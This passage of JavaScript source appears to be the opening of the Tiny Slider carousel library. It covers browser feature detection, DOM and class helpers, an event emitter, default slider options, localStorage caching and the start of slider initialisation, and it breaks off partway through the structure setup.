var tns = (function (){
    var win = window;
    
    var raf = win.requestAnimationFrame
      || win.webkitRequestAnimationFrame
      || win.mozRequestAnimationFrame
      || win.msRequestAnimationFrame
      || function(cb) { return setTimeout(cb, 16); };
    
    var win$1 = window;
    
    var caf = win$1.cancelAnimationFrame
      || win$1.mozCancelAnimationFrame
      || function(id){ clearTimeout(id); };
    
    function extend() {
      var obj, name, copy,
          target = arguments[0] || {},
          i = 1,
          length = arguments.length;
    
      for (; i < length; i++) {
        if ((obj = arguments[i]) !== null) {
          for (name in obj) {
            copy = obj[name];
    
            if (target === copy) {
              continue;
            } else if (copy !== undefined) {
              target[name] = copy;
            }
          }
        }
      }
      return target;
    }
    
    function checkStorageValue (value) {
      return ['true', 'false'].indexOf(value) >= 0 ? JSON.parse(value) : value;
    }
    
    function setLocalStorage(storage, key, value, access) {
      if (access) {
        try { storage.setItem(key, value); } catch (e) {}
      }
      return value;
    }
    
    function getSlideId() {
      var id = window.tnsId;
      window.tnsId = !id ? 1 : id + 1;
      
      return 'tns' + window.tnsId;
    }
    
    function getBody () {
      var doc = document,
          body = doc.body;
    
      if (!body) {
        body = doc.createElement('body');
        body.fake = true;
      }
    
      return body;
    }
    
    var docElement = document.documentElement;
    
    function setFakeBody (body) {
      var docOverflow = '';
      if (body.fake) {
        docOverflow = docElement.style.overflow;
        //avoid crashing IE8, if background image is used
        body.style.background = '';
        //Safari 5.13/5.1.4 OSX stops loading if ::-webkit-scrollbar is used and scrollbars are visible
        body.style.overflow = docElement.style.overflow = 'hidden';
        docElement.appendChild(body);
      }
    
      return docOverflow;
    }
    
    function resetFakeBody (body, docOverflow) {
      if (body.fake) {
        body.remove();
        docElement.style.overflow = docOverflow;
        // Trigger layout so kinetic scrolling isn't disabled in iOS6+
        // eslint-disable-next-line
        docElement.offsetHeight;
      }
    }
    
    // get css-calc 
    
    function calc() {
      var doc = document, 
          body = getBody(),
          docOverflow = setFakeBody(body),
          div = doc.createElement('div'), 
          result = false;
    
      body.appendChild(div);
      try {
        var str = '(10px * 10)',
            vals = ['calc' + str, '-moz-calc' + str, '-webkit-calc' + str],
            val;
        for (var i = 0; i < 3; i++) {
          val = vals[i];
          div.style.width = val;
          if (div.offsetWidth === 100) { 
            result = val.replace(str, ''); 
            break;
          }
        }
      } catch (e) {}
      
      body.fake ? resetFakeBody(body, docOverflow) : div.remove();
    
      return result;
    }
    
    // get subpixel support value
    
    function percentageLayout() {
      // check subpixel layout supporting
      var doc = document,
          body = getBody(),
          docOverflow = setFakeBody(body),
          wrapper = doc.createElement('div'),
          outer = doc.createElement('div'),
          str = '',
          count = 70,
          perPage = 3,
          supported = false;
    
      wrapper.className = "tns-t-subp2";
      outer.className = "tns-t-ct";
    
      for (var i = 0; i < count; i++) {
        str += '<div></div>';
      }
    
      outer.innerHTML = str;
      wrapper.appendChild(outer);
      body.appendChild(wrapper);
    
      supported = Math.abs(wrapper.getBoundingClientRect().left - outer.children[count - perPage].getBoundingClientRect().left) < 2;
    
      body.fake ? resetFakeBody(body, docOverflow) : wrapper.remove();
    
      return supported;
    }
    
    function mediaquerySupport () {
      if (window.matchMedia || window.msMatchMedia) {
        return true;
      }
      
      var doc = document,
          body = getBody(),
          docOverflow = setFakeBody(body),
          div = doc.createElement('div'),
          style = doc.createElement('style'),
          rule = '@media all and (min-width:1px){.tns-mq-test{position:absolute}}',
          position;
    
      style.type = 'text/css';
      div.className = 'tns-mq-test';
    
      body.appendChild(style);
      body.appendChild(div);
    
      if (style.styleSheet) {
        style.styleSheet.cssText = rule;
      } else {
        style.appendChild(doc.createTextNode(rule));
      }
    
      position = window.getComputedStyle ? window.getComputedStyle(div).position : div.currentStyle['position'];
    
      body.fake ? resetFakeBody(body, docOverflow) : div.remove();
    
      return position === "absolute";
    }
    
    // create and append style sheet
    function createStyleSheet (media, nonce) {
      // Create the <style> tag
      var style = document.createElement("style");
      // style.setAttribute("type", "text/css");
    
      // Add a media (and/or media query) here if you'd like!
      // style.setAttribute("media", "screen")
      // style.setAttribute("media", "only screen and (max-width : 1024px)")
      if (media) { style.setAttribute("media", media); }
    
      // Add nonce attribute for Content Security Policy
      if (nonce) { style.setAttribute("nonce", nonce); }
    
      // WebKit hack :(
      // style.appendChild(document.createTextNode(""));
    
      // Add the <style> element to the page
      document.querySelector('head').appendChild(style);
    
      return style.sheet ? style.sheet : style.styleSheet;
    }
    
    // cross browsers addRule method
    function addCSSRule(sheet, selector, rules, index) {
      // return raf(function() {
        'insertRule' in sheet ?
          sheet.insertRule(selector + '{' + rules + '}', index) :
          sheet.addRule(selector, rules, index);
      // });
    }
    
    // cross browsers addRule method
    function removeCSSRule(sheet, index) {
      // return raf(function() {
        'deleteRule' in sheet ?
          sheet.deleteRule(index) :
          sheet.removeRule(index);
      // });
    }
    
    function getCssRulesLength(sheet) {
      var rule = ('insertRule' in sheet) ? sheet.cssRules : sheet.rules;
      return rule.length;
    }
    
    function toDegree (y, x) {
      return Math.atan2(y, x) * (180 / Math.PI);
    }
    
    function getTouchDirection(angle, range) {
      var direction = false,
          gap = Math.abs(90 - Math.abs(angle));
          
      if (gap >= 90 - range) {
        direction = 'horizontal';
      } else if (gap <= range) {
        direction = 'vertical';
      }
    
      return direction;
    }
    
    // https://toddmotto.com/ditch-the-array-foreach-call-nodelist-hack/
    function forEach (arr, callback, scope) {
      for (var i = 0, l = arr.length; i < l; i++) {
        callback.call(scope, arr[i], i);
      }
    }
    
    var classListSupport = 'classList' in document.createElement('_');
    
    var hasClass = classListSupport ?
        function (el, str) { return el.classList.contains(str); } :
        function (el, str) { return el.className.indexOf(str) >= 0; };
    
    var addClass = classListSupport ?
        function (el, str) {
          if (!hasClass(el,  str)) { el.classList.add(str); }
        } :
        function (el, str) {
          if (!hasClass(el,  str)) { el.className += ' ' + str; }
        };
    
    var removeClass = classListSupport ?
        function (el, str) {
          if (hasClass(el,  str)) { el.classList.remove(str); }
        } :
        function (el, str) {
          if (hasClass(el, str)) { el.className = el.className.replace(str, ''); }
        };
    
    function hasAttr(el, attr) {
      return el.hasAttribute(attr);
    }
    
    function getAttr(el, attr) {
      return el.getAttribute(attr);
    }
    
    function isNodeList(el) {
      // Only NodeList has the "item()" function
      return typeof el.item !== "undefined"; 
    }
    
    function setAttrs(els, attrs) {
      els = (isNodeList(els) || els instanceof Array) ? els : [els];
      if (Object.prototype.toString.call(attrs) !== '[object Object]') { return; }
    
      for (var i = els.length; i--;) {
        for(var key in attrs) {
          els[i].setAttribute(key, attrs[key]);
        }
      }
    }
    
    function removeAttrs(els, attrs) {
      els = (isNodeList(els) || els instanceof Array) ? els : [els];
      attrs = (attrs instanceof Array) ? attrs : [attrs];
    
      var attrLength = attrs.length;
      for (var i = els.length; i--;) {
        for (var j = attrLength; j--;) {
          els[i].removeAttribute(attrs[j]);
        }
      }
    }
    
    function arrayFromNodeList (nl) {
      var arr = [];
      for (var i = 0, l = nl.length; i < l; i++) {
        arr.push(nl[i]);
      }
      return arr;
    }
    
    function hideElement(el, forceHide) {
      if (el.style.display !== 'none') { el.style.display = 'none'; }
    }
    
    function showElement(el, forceHide) {
      if (el.style.display === 'none') { el.style.display = ''; }
    }
    
    function isVisible(el) {
      return window.getComputedStyle(el).display !== 'none';
    }
    
    function whichProperty(props){
      if (typeof props === 'string') {
        var arr = [props],
            Props = props.charAt(0).toUpperCase() + props.substr(1),
            prefixes = ['Webkit', 'Moz', 'ms', 'O'];
            
        prefixes.forEach(function(prefix) {
          if (prefix !== 'ms' || props === 'transform') {
            arr.push(prefix + Props);
          }
        });
    
        props = arr;
      }
    
      var el = document.createElement('fakeelement'),
          len = props.length;
      for(var i = 0; i < props.length; i++){
        var prop = props[i];
        if( el.style[prop] !== undefined ){ return prop; }
      }
    
      return false; // explicit for ie9-
    }
    
    function has3DTransforms(tf){
      if (!tf) { return false; }
      if (!window.getComputedStyle) { return false; }
      
      var doc = document,
          body = getBody(),
          docOverflow = setFakeBody(body),
          el = doc.createElement('p'),
          has3d,
          cssTF = tf.length > 9 ? '-' + tf.slice(0, -9).toLowerCase() + '-' : '';
    
      cssTF += 'transform';
    
      // Add it to the body to get the computed style
      body.insertBefore(el, null);
    
      el.style[tf] = 'translate3d(1px,1px,1px)';
      has3d = window.getComputedStyle(el).getPropertyValue(cssTF);
    
      body.fake ? resetFakeBody(body, docOverflow) : el.remove();
    
      return (has3d !== undefined && has3d.length > 0 && has3d !== "none");
    }
    
    // get transitionend, animationend based on transitionDuration
    // @propin: string
    // @propOut: string, first-letter uppercase
    // Usage: getEndProperty('WebkitTransitionDuration', 'Transition') => webkitTransitionEnd
    function getEndProperty(propIn, propOut) {
      var endProp = false;
      if (/^Webkit/.test(propIn)) {
        endProp = 'webkit' + propOut + 'End';
      } else if (/^O/.test(propIn)) {
        endProp = 'o' + propOut + 'End';
      } else if (propIn) {
        endProp = propOut.toLowerCase() + 'end';
      }
      return endProp;
    }
    
    // Test via a getter in the options object to see if the passive property is accessed
    var supportsPassive = false;
    try {
      var opts = Object.defineProperty({}, 'passive', {
        get: function() {
          supportsPassive = true;
        }
      });
      window.addEventListener("test", null, opts);
    } catch (e) {}
    var passiveOption = supportsPassive ? { passive: true } : false;
    
    function addEvents(el, obj, preventScrolling) {
      for (var prop in obj) {
        var option = ['touchstart', 'touchmove'].indexOf(prop) >= 0 && !preventScrolling ? passiveOption : false;
        el.addEventListener(prop, obj[prop], option);
      }
    }
    
    function removeEvents(el, obj) {
      for (var prop in obj) {
        var option = ['touchstart', 'touchmove'].indexOf(prop) >= 0 ? passiveOption : false;
        el.removeEventListener(prop, obj[prop], option);
      }
    }
    
    function Events() {
      return {
        topics: {},
        on: function (eventName, fn) {
          this.topics[eventName] = this.topics[eventName] || [];
          this.topics[eventName].push(fn);
        },
        off: function(eventName, fn) {
          if (this.topics[eventName]) {
            for (var i = 0; i < this.topics[eventName].length; i++) {
              if (this.topics[eventName][i] === fn) {
                this.topics[eventName].splice(i, 1);
                break;
              }
            }
          }
        },
        emit: function (eventName, data) {
          data.type = eventName;
          if (this.topics[eventName]) {
            this.topics[eventName].forEach(function(fn) {
              fn(data, eventName);
            });
          }
        }
      };
    }
    
    function jsTransform(element, attr, prefix, postfix, to, duration, callback) {
      var tick = Math.min(duration, 10),
          unit = (to.indexOf('%') >= 0) ? '%' : 'px',
          to = to.replace(unit, ''),
          from = Number(element.style[attr].replace(prefix, '').replace(postfix, '').replace(unit, '')),
          positionTick = (to - from) / duration * tick,
          running;
    
      setTimeout(moveElement, tick);
      function moveElement() {
        duration -= tick;
        from += positionTick;
        element.style[attr] = prefix + from + unit + postfix;
        if (duration > 0) { 
          setTimeout(moveElement, tick); 
        } else {
          callback();
        }
      }
    }
    
    // Object.keys
    if (!Object.keys) {
      Object.keys = function(object) {
        var keys = [];
        for (var name in object) {
          if (Object.prototype.hasOwnProperty.call(object, name)) {
            keys.push(name);
          }
        }
        return keys;
      };
    }
    
    // ChildNode.remove
    if(!("remove" in Element.prototype)){
      Element.prototype.remove = function(){
        if(this.parentNode) {
          this.parentNode.removeChild(this);
        }
      };
    }
    
    var tns = function(options) {
      options = extend({
        container: '.slider',
        mode: 'carousel',
        axis: 'horizontal',
        items: 1,
        gutter: 0,
        edgePadding: 0,
        fixedWidth: false,
        autoWidth: false,
        viewportMax: false,
        slideBy: 1,
        center: false,
        controls: true,
        controlsPosition: 'top',
        controlsText: ['prev', 'next'],
        controlsContainer: false,
        prevButton: false,
        nextButton: false,
        nav: true,
        navPosition: 'top',
        navContainer: false,
        navAsThumbnails: false,
        arrowKeys: false,
        speed: 300,
        autoplay: false,
        autoplayPosition: 'top',
        autoplayTimeout: 5000,
        autoplayDirection: 'forward',
        autoplayText: ['start', 'stop'],
        autoplayHoverPause: false,
        autoplayButton: false,
        autoplayButtonOutput: true,
        autoplayResetOnVisibility: true,
        animateIn: 'tns-fadeIn',
        animateOut: 'tns-fadeOut',
        animateNormal: 'tns-normal',
        animateDelay: false,
        loop: true,
        rewind: false,
        autoHeight: false,
        responsive: false,
        lazyload: false,
        lazyloadSelector: '.tns-lazy-img',
        touch: true,
        mouseDrag: false,
        swipeAngle: 15,
        nested: false,
        preventActionWhenRunning: false,
        preventScrollOnTouch: false,
        freezable: true,
        onInit: false,
        useLocalStorage: true,
        nonce: false
      }, options || {});
    
      var doc = document,
          win = window,
          KEYS = {
            ENTER: 13,
            SPACE: 32,
            LEFT: 37,
            RIGHT: 39
          },
          tnsStorage = {},
          localStorageAccess = options.useLocalStorage;
    
      if (localStorageAccess) {
        // check browser version and local storage access
        var browserInfo = navigator.userAgent;
        var uid = new Date;
    
        try {
          tnsStorage = win.localStorage;
          if (tnsStorage) {
            tnsStorage.setItem(uid, uid);
            localStorageAccess = tnsStorage.getItem(uid) == uid;
            tnsStorage.removeItem(uid);
          } else {
            localStorageAccess = false;
          }
          if (!localStorageAccess) { tnsStorage = {}; }
        } catch(e) {
          localStorageAccess = false;
        }
    
        if (localStorageAccess) {
          // remove storage when browser version changes
          if (tnsStorage['tnsApp'] && tnsStorage['tnsApp'] !== browserInfo) {
            ['tC', 'tPL', 'tMQ', 'tTf', 't3D', 'tTDu', 'tTDe', 'tADu', 'tADe', 'tTE', 'tAE'].forEach(function(item) { tnsStorage.removeItem(item); });
          }
          // update browserInfo
          localStorage['tnsApp'] = browserInfo;
        }
      }
    
      var CALC = tnsStorage['tC'] ? checkStorageValue(tnsStorage['tC']) : setLocalStorage(tnsStorage, 'tC', calc(), localStorageAccess),
          PERCENTAGELAYOUT = tnsStorage['tPL'] ? checkStorageValue(tnsStorage['tPL']) : setLocalStorage(tnsStorage, 'tPL', percentageLayout(), localStorageAccess),
          CSSMQ = tnsStorage['tMQ'] ? checkStorageValue(tnsStorage['tMQ']) : setLocalStorage(tnsStorage, 'tMQ', mediaquerySupport(), localStorageAccess),
          TRANSFORM = tnsStorage['tTf'] ? checkStorageValue(tnsStorage['tTf']) : setLocalStorage(tnsStorage, 'tTf', whichProperty('transform'), localStorageAccess),
          HAS3DTRANSFORMS = tnsStorage['t3D'] ? checkStorageValue(tnsStorage['t3D']) : setLocalStorage(tnsStorage, 't3D', has3DTransforms(TRANSFORM), localStorageAccess),
          TRANSITIONDURATION = tnsStorage['tTDu'] ? checkStorageValue(tnsStorage['tTDu']) : setLocalStorage(tnsStorage, 'tTDu', whichProperty('transitionDuration'), localStorageAccess),
          TRANSITIONDELAY = tnsStorage['tTDe'] ? checkStorageValue(tnsStorage['tTDe']) : setLocalStorage(tnsStorage, 'tTDe', whichProperty('transitionDelay'), localStorageAccess),
          ANIMATIONDURATION = tnsStorage['tADu'] ? checkStorageValue(tnsStorage['tADu']) : setLocalStorage(tnsStorage, 'tADu', whichProperty('animationDuration'), localStorageAccess),
          ANIMATIONDELAY = tnsStorage['tADe'] ? checkStorageValue(tnsStorage['tADe']) : setLocalStorage(tnsStorage, 'tADe', whichProperty('animationDelay'), localStorageAccess),
          TRANSITIONEND = tnsStorage['tTE'] ? checkStorageValue(tnsStorage['tTE']) : setLocalStorage(tnsStorage, 'tTE', getEndProperty(TRANSITIONDURATION, 'Transition'), localStorageAccess),
          ANIMATIONEND = tnsStorage['tAE'] ? checkStorageValue(tnsStorage['tAE']) : setLocalStorage(tnsStorage, 'tAE', getEndProperty(ANIMATIONDURATION, 'Animation'), localStorageAccess);
    
      // get element nodes from selectors
      var supportConsoleWarn = win.console && typeof win.console.warn === "function",
          tnsList = ['container', 'controlsContainer', 'prevButton', 'nextButton', 'navContainer', 'autoplayButton'],
          optionsElements = {};
    
      tnsList.forEach(function(item) {
        if (typeof options[item] === 'string') {
          var str = options[item],
              el = doc.querySelector(str);
          optionsElements[item] = str;
    
          if (el && el.nodeName) {
            options[item] = el;
          } else {
            if (supportConsoleWarn) { console.warn('Can\'t find', options[item]); }
            return;
          }
        }
      });
    
      // make sure at least 1 slide
      if (options.container.children.length < 1) {
        if (supportConsoleWarn) { console.warn('No slides found in', options.container); }
        return;
       }
    
      // update options
      var responsive = options.responsive,
          nested = options.nested,
          carousel = options.mode === 'carousel' ? true : false;
    
      if (responsive) {
        // apply responsive[0] to options and remove it
        if (0 in responsive) {
          options = extend(options, responsive[0]);
          delete responsive[0];
        }
    
        var responsiveTem = {};
        for (var key in responsive) {
          var val = responsive[key];
          // update responsive
          // from: 300: 2
          // to:
          //   300: {
          //     items: 2
          //   }
          val = typeof val === 'number' ? {items: val} : val;
          responsiveTem[key] = val;
        }
        responsive = responsiveTem;
        responsiveTem = null;
      }
    
      // update options
      function updateOptions (obj) {
        for (var key in obj) {
          if (!carousel) {
            if (key === 'slideBy') { obj[key] = 'page'; }
            if (key === 'edgePadding') { obj[key] = false; }
            if (key === 'autoHeight') { obj[key] = false; }
          }
    
          // update responsive options
          if (key === 'responsive') { updateOptions(obj[key]); }
        }
      }
      if (!carousel) { updateOptions(options); }
    
    
      // === define and set variables ===
      if (!carousel) {
        options.axis = 'horizontal';
        options.slideBy = 'page';
        options.edgePadding = false;
    
        var animateIn = options.animateIn,
            animateOut = options.animateOut,
            animateDelay = options.animateDelay,
            animateNormal = options.animateNormal;
      }
    
      var horizontal = options.axis === 'horizontal' ? true : false,
          outerWrapper = doc.createElement('div'),
          innerWrapper = doc.createElement('div'),
          middleWrapper,
          container = options.container,
          containerParent = container.parentNode,
          containerHTML = container.outerHTML,
          slideItems = container.children,
          slideCount = slideItems.length,
          breakpointZone,
          windowWidth = getWindowWidth(),
          isOn = false;
      if (responsive) { setBreakpointZone(); }
      if (carousel) { container.className += ' tns-vpfix'; }
    
      // fixedWidth: viewport > rightBoundary > indexMax
      var autoWidth = options.autoWidth,
          fixedWidth = getOption('fixedWidth'),
          edgePadding = getOption('edgePadding'),
          gutter = getOption('gutter'),
          viewport = getViewportWidth(),
          center = getOption('center'),
          items = !autoWidth ? Math.floor(getOption('items')) : 1,
          slideBy = getOption('slideBy'),
          viewportMax = options.viewportMax || options.fixedWidthViewportWidth,
          arrowKeys = getOption('arrowKeys'),
          speed = getOption('speed'),
          rewind = options.rewind,
          loop = rewind ? false : options.loop,
          autoHeight = getOption('autoHeight'),
          controls = getOption('controls'),
          controlsText = getOption('controlsText'),
          nav = getOption('nav'),
          touch = getOption('touch'),
          mouseDrag = getOption('mouseDrag'),
          autoplay = getOption('autoplay'),
          autoplayTimeout = getOption('autoplayTimeout'),
          autoplayText = getOption('autoplayText'),
          autoplayHoverPause = getOption('autoplayHoverPause'),
          autoplayResetOnVisibility = getOption('autoplayResetOnVisibility'),
          sheet = createStyleSheet(null, getOption('nonce')),
          lazyload = options.lazyload,
          lazyloadSelector = options.lazyloadSelector,
          slidePositions, // collection of slide positions
          slideItemsOut = [],
          cloneCount = loop ? getCloneCountForLoop() : 0,
          slideCountNew = !carousel ? slideCount + cloneCount : slideCount + cloneCount * 2,
          hasRightDeadZone = (fixedWidth || autoWidth) && !loop ? true : false,
          rightBoundary = fixedWidth ? getRightBoundary() : null,
          updateIndexBeforeTransform = (!carousel || !loop) ? true : false,
          // transform
          transformAttr = horizontal ? 'left' : 'top',
          transformPrefix = '',
          transformPostfix = '',
          // index
          getIndexMax = (function () {
            if (fixedWidth) {
              return function() { return center && !loop ? slideCount - 1 : Math.ceil(- rightBoundary / (fixedWidth + gutter)); };
            } else if (autoWidth) {
              return function() {
                for (var i = 0; i < slideCountNew; i++) {
                  if (slidePositions[i] >= - rightBoundary) { return i; }
                }
              };
            } else {
              return function() {
                if (center && carousel && !loop) {
                  return slideCount - 1;
                } else {
                  return loop || carousel ? Math.max(0, slideCountNew - Math.ceil(items)) : slideCountNew - 1;
                }
              };
            }
          })(),
          index = getStartIndex(getOption('startIndex')),
          indexCached = index,
          displayIndex = getCurrentSlide(),
          indexMin = 0,
          indexMax = !autoWidth ? getIndexMax() : null,
          // resize
          resizeTimer,
          preventActionWhenRunning = options.preventActionWhenRunning,
          swipeAngle = options.swipeAngle,
          moveDirectionExpected = swipeAngle ? '?' : true,
          running = false,
          onInit = options.onInit,
          events = new Events(),
          // id, class
          newContainerClasses = ' tns-slider tns-' + options.mode,
          slideId = container.id || getSlideId(),
          disable = getOption('disable'),
          disabled = false,
          freezable = options.freezable,
          freeze = freezable && !autoWidth ? getFreeze() : false,
          frozen = false,
          controlsEvents = {
            'click': onControlsClick,
            'keydown': onControlsKeydown
          },
          navEvents = {
            'click': onNavClick,
            'keydown': onNavKeydown
          },
          hoverEvents = {
            'mouseover': mouseoverPause,
            'mouseout': mouseoutRestart
          },
          visibilityEvent = {'visibilitychange': onVisibilityChange},
          docmentKeydownEvent = {'keydown': onDocumentKeydown},
          touchEvents = {
            'touchstart': onPanStart,
            'touchmove': onPanMove,
            'touchend': onPanEnd,
            'touchcancel': onPanEnd
          }, dragEvents = {
            'mousedown': onPanStart,
            'mousemove': onPanMove,
            'mouseup': onPanEnd,
            'mouseleave': onPanEnd
          },
          hasControls = hasOption('controls'),
          hasNav = hasOption('nav'),
          navAsThumbnails = autoWidth ? true : options.navAsThumbnails,
          hasAutoplay = hasOption('autoplay'),
          hasTouch = hasOption('touch'),
          hasMouseDrag = hasOption('mouseDrag'),
          slideActiveClass = 'tns-slide-active',
          slideClonedClass = 'tns-slide-cloned',
          imgCompleteClass = 'tns-complete',
          imgEvents = {
            'load': onImgLoaded,
            'error': onImgFailed
          },
          imgsComplete,
          liveregionCurrent,
          preventScroll = options.preventScrollOnTouch === 'force' ? true : false;
    
      // controls
      if (hasControls) {
        var controlsContainer = options.controlsContainer,
            controlsContainerHTML = options.controlsContainer ? options.controlsContainer.outerHTML : '',
            prevButton = options.prevButton,
            nextButton = options.nextButton,
            prevButtonHTML = options.prevButton ? options.prevButton.outerHTML : '',
            nextButtonHTML = options.nextButton ? options.nextButton.outerHTML : '',
            prevIsButton,
            nextIsButton;
      }
    
      // nav
      if (hasNav) {
        var navContainer = options.navContainer,
            navContainerHTML = options.navContainer ? options.navContainer.outerHTML : '',
            navItems,
            pages = autoWidth ? slideCount : getPages(),
            pagesCached = 0,
            navClicked = -1,
            navCurrentIndex = getCurrentNavIndex(),
            navCurrentIndexCached = navCurrentIndex,
            navActiveClass = 'tns-nav-active',
            navStr = 'Carousel Page ',
            navStrCurrent = ' (Current Slide)';
      }
    
      // autoplay
      if (hasAutoplay) {
        var autoplayDirection = options.autoplayDirection === 'forward' ? 1 : -1,
            autoplayButton = options.autoplayButton,
            autoplayButtonHTML = options.autoplayButton ? options.autoplayButton.outerHTML : '',
            autoplayHtmlStrings = ['<span class=\'tns-visually-hidden\'>', ' animation</span>'],
            autoplayTimer,
            animating,
            autoplayHoverPaused,
            autoplayUserPaused,
            autoplayVisibilityPaused;
      }
    
      if (hasTouch || hasMouseDrag) {
        var initPosition = {},
            lastPosition = {},
            translateInit,
            disX,
            disY,
            panStart = false,
            rafIndex,
            getDist = horizontal ?
              function(a, b) { return a.x - b.x; } :
              function(a, b) { return a.y - b.y; };
      }
    
      // disable slider when slidecount <= items
      if (!autoWidth) { resetVariblesWhenDisable(disable || freeze); }
    
      if (TRANSFORM) {
        transformAttr = TRANSFORM;
        transformPrefix = 'translate';
    
        if (HAS3DTRANSFORMS) {
          transformPrefix += horizontal ? '3d(' : '3d(0px, ';
          transformPostfix = horizontal ? ', 0px, 0px)' : ', 0px)';
        } else {
          transformPrefix += horizontal ? 'X(' : 'Y(';
          transformPostfix = ')';
        }
    
      }
    
      if (carousel) { container.className = container.className.replace('tns-vpfix', ''); }
      initStructure();
      initSheet();
      initSliderTransform();
    
      // === COMMON FUNCTIONS === //
      function resetVariblesWhenDisable (condition) {
        if (condition) {
          controls = nav = touch = mouseDrag = arrowKeys = autoplay = autoplayHoverPause = autoplayResetOnVisibility = false;
        }
      }
    
      function getCurrentSlide () {
        var tem = carousel ? index - cloneCount : index;
        while (tem < 0) { tem += slideCount; }
        return tem%slideCount + 1;
      }
    
      function getStartIndex (ind) {
        ind = ind ? Math.max(0, Math.min(loop ? slideCount - 1 : slideCount - items, ind)) : 0;
        return carousel ? ind + cloneCount : ind;
      }
    
      function getAbsIndex (i) {
        if (i == null) { i = index; }
    
        if (carousel) { i -= cloneCount; }
        while (i < 0) { i += slideCount; }
    
        return Math.floor(i%slideCount);
      }
    
      function getCurrentNavIndex () {
        var absIndex = getAbsIndex(),
            result;
    
        result = navAsThumbnails ? absIndex :
          fixedWidth || autoWidth ? Math.ceil((absIndex + 1) * pages / slideCount - 1) :
              Math.floor(absIndex / items);
    
        // set active nav to the last one when reaches the right edge
        if (!loop && carousel && index === indexMax) { result = pages - 1; }
    
        return result;
      }
    
      function getItemsMax () {
        // fixedWidth or autoWidth while viewportMax is not available
        if (autoWidth || (fixedWidth && !viewportMax)) {
          return slideCount - 1;
        // most cases
        } else {
          var str = fixedWidth ? 'fixedWidth' : 'items',
              arr = [];
    
          if (fixedWidth || options[str] < slideCount) { arr.push(options[str]); }
    
          if (responsive) {
            for (var bp in responsive) {
              var tem = responsive[bp][str];
              if (tem && (fixedWidth || tem < slideCount)) { arr.push(tem); }
            }
          }
    
          if (!arr.length) { arr.push(0); }
    
          return Math.ceil(fixedWidth ? viewportMax / Math.min.apply(null, arr) : Math.max.apply(null, arr));
        }
      }
    
      function getCloneCountForLoop () {
        var itemsMax = getItemsMax(),
            result = carousel ? Math.ceil((itemsMax * 5 - slideCount)/2) : (itemsMax * 4 - slideCount);
        result = Math.max(itemsMax, result);
    
        return hasOption('edgePadding') ? result + 1 : result;
      }
    
      function getWindowWidth () {
        return win.innerWidth || doc.documentElement.clientWidth || doc.body.clientWidth;
      }
    
      function getInsertPosition (pos) {
        return pos === 'top' ? 'afterbegin' : 'beforeend';
      }
    
      function getClientWidth (el) {
        if (el == null) { return; }
        var div = doc.createElement('div'), rect, width;
        el.appendChild(div);
        rect = div.getBoundingClientRect();
        width = rect.right - rect.left;
        div.remove();
        return width || getClientWidth(el.parentNode);
      }
    
      function getViewportWidth () {
        var gap = edgePadding ? edgePadding * 2 - gutter : 0;
        return getClientWidth(containerParent) - gap;
      }
    
      function hasOption (item) {
        if (options[item]) {
          return true;
        } else {
          if (responsive) {
            for (var bp in responsive) {
              if (responsive[bp][item]) { return true; }
            }
          }
          return false;
        }
      }
    
      // get option:
      // fixed width: viewport, fixedWidth, gutter => items
      // others: window width => all variables
      // all: items => slideBy
      function getOption (item, ww) {
        if (ww == null) { ww = windowWidth; }
    
        if (item === 'items' && fixedWidth) {
          return Math.floor((viewport + gutter) / (fixedWidth + gutter)) || 1;
    
        } else {
          var result = options[item];
    
          if (responsive) {
            for (var bp in responsive) {
              // bp: convert string to number
              if (ww >= parseInt(bp)) {
                if (item in responsive[bp]) { result = responsive[bp][item]; }
              }
            }
          }
    
          if (item === 'slideBy' && result === 'page') { result = getOption('items'); }
          if (!carousel && (item === 'slideBy' || item === 'items')) { result = Math.floor(result); }
    
          return result;
        }
      }
    
      function getSlideMarginLeft (i) {
        return CALC ?
          CALC + '(' + i * 100 + '% / ' + slideCountNew + ')' :
          i * 100 / slideCountNew + '%';
      }
    
      function getInnerWrapperStyles (edgePaddingTem, gutterTem, fixedWidthTem, speedTem, autoHeightBP) {
        var str = '';
    
        if (edgePaddingTem !== undefined) {
          var gap = edgePaddingTem;
          if (gutterTem) { gap -= gutterTem; }
          str = horizontal ?
            'margin: 0 ' + gap + 'px 0 ' + edgePaddingTem + 'px;' :
            'margin: ' + edgePaddingTem + 'px 0 ' + gap + 'px 0;';
        } else if (gutterTem && !fixedWidthTem) {
          var gutterTemUnit = '-' + gutterTem + 'px',
              dir = horizontal ? gutterTemUnit + ' 0 0' : '0 ' + gutterTemUnit + ' 0';
          str = 'margin: 0 ' + dir + ';';
        }
    
        if (!carousel && autoHeightBP && TRANSITIONDURATION && speedTem) { str += getTransitionDurationStyle(speedTem); }
        return str;
      }
    
      function getContainerWidth (fixedWidthTem, gutterTem, itemsTem) {
        if (fixedWidthTem) {
          return (fixedWidthTem + gutterTem) * slideCountNew + 'px';
        } else {
          return CALC ?
            CALC + '(' + slideCountNew * 100 + '% / ' + itemsTem + ')' :
            slideCountNew * 100 / itemsTem + '%';
        }
      }
    
      function getSlideWidthStyle (fixedWidthTem, gutterTem, itemsTem) {
        var width;
    
        if (fixedWidthTem) {
          width = (fixedWidthTem + gutterTem) + 'px';
        } else {
          if (!carousel) { itemsTem = Math.floor(itemsTem); }
          var dividend = carousel ? slideCountNew : itemsTem;
          width = CALC ?
            CALC + '(100% / ' + dividend + ')' :
            100 / dividend + '%';
        }
    
        width = 'width:' + width;
    
        // inner slider: overwrite outer slider styles
        return nested !== 'inner' ? width + ';' : width + ' !important;';
      }
    
      function getSlideGutterStyle (gutterTem) {
        var str = '';
    
        // gutter maybe interger || 0
        // so can't use 'if (gutter)'
        if (gutterTem !== false) {
          var prop = horizontal ? 'padding-' : 'margin-',
              dir = horizontal ? 'right' : 'bottom';
          str = prop +  dir + ': ' + gutterTem + 'px;';
        }
    
        return str;
      }
    
      function getCSSPrefix (name, num) {
        var prefix = name.substring(0, name.length - num).toLowerCase();
        if (prefix) { prefix = '-' + prefix + '-'; }
    
        return prefix;
      }
    
      function getTransitionDurationStyle (speed) {
        return getCSSPrefix(TRANSITIONDURATION, 18) + 'transition-duration:' + speed / 1000 + 's;';
      }
    
      function getAnimationDurationStyle (speed) {
        return getCSSPrefix(ANIMATIONDURATION, 17) + 'animation-duration:' + speed / 1000 + 's;';
      }
    
      function initStructure () {
        var classOuter = 'tns-outer',
            classInner = 'tns-inner',
            hasGutter = hasOption('gutter');
    
        outerWrapper.className = classOuter;
        innerWrapper.className = classInner;
        outerWrapper.id = slideId + '-ow';
        innerWrapper.id = slideId + '-iw';
    
        // set container properties
        if (container.id === '') { container.id = slideId; }
